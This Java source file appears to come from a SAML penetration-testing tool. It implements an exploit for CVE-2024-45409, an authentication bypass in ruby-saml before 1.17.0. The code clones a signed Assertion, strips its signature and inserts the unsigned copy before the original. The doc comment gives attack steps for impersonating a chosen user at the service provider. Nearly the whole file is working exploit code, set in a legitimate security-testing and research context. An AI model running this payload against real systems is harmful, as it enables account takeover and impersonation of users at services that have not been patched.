package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;

/// Authentication bypass in ruby-saml < 1.17.0.
///
/// ruby-saml validated that a signature existed somewhere in the Response but did
/// not enforce that the specific Assertion being consumed was itself covered by
/// that signature. An attacker who can intercept and modify a SAML response can
/// prepend an unsigned malicious Assertion before the legitimately-signed one.
/// ruby-saml < 1.17.0 processes the *first* Assertion it finds, so it returns
/// the attacker-controlled identity without ever verifying it.
///
/// Key difference from CVE-2022-41912 (crewjam/saml): that CVE appends the evil
/// assertion *after* the signed one; this CVE prepends it *before*, targeting
/// ruby-saml's XPath evaluation order.
///
/// Attack steps:
///   1. Apply this payload to a valid signed SAMLResponse.
///   2. Modify the prepended (unsigned) Assertion — change NameID or Attributes
///      to impersonate the target user.
///   3. Forward to the SP. ruby-saml < 1.17.0 will authenticate as that user.
///
/// Links:
/// * Advisory (GHSA-jw9c-mfg7-9rx2): https://github.com/advisories/GHSA-jw9c-mfg7-9rx2
/// * CVE:                             https://nvd.nist.gov/vuln/detail/CVE-2024-45409
/// * PortSwigger SAML research:       https://portswigger.net/research/saml-roulette-the-hacker-always-wins
/// * ruby-saml fix (1.17.0):          https://github.com/SAML-Toolkits/ruby-saml/releases/tag/v1.17.0
public class CVE_2024_45409 {

    public static final String CVE = "CVE-2024-45409";

    public static String apply(String samlMessage) throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
        if (response == null) {
            throw new IllegalArgumentException("No 'Response' element found.");
        }

        Element originalAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        if (originalAssertion == null) {
            throw new IllegalArgumentException("No 'Assertion' element found.");
        }

        // Clone the signed assertion to produce the malicious one.
        Element evilAssertion = (Element) originalAssertion.cloneNode(true);

        // Give it a distinct ID so it does not collide with the signed assertion's ID.
        String originalID = originalAssertion.getAttribute("ID");
        evilAssertion.setAttribute("ID", originalID.isEmpty()
                ? "evil_assertion_" + System.currentTimeMillis()
                : originalID + "_evil");

        // Remove the signature from the evil assertion — it is unsigned by design.
        NodeList children = evilAssertion.getChildNodes();
        for (int i = 0; i < children.getLength(); i++) {
            Node child = children.item(i);
            if (child.getNodeType() == Node.ELEMENT_NODE && "Signature".equals(child.getLocalName())) {
                Node prev = child.getPreviousSibling();
                if (prev != null && prev.getNodeType() == Node.TEXT_NODE
                        && prev.getTextContent().trim().isEmpty()) {
                    evilAssertion.removeChild(prev);
                }
                evilAssertion.removeChild(child);
                break;
            }
        }

        // Prepend the evil assertion before the original so ruby-saml's XPath picks it first.
        response.insertBefore(evilAssertion, originalAssertion);

        return xmlHelpers.getString(document);
    }

    private CVE_2024_45409() {}
}
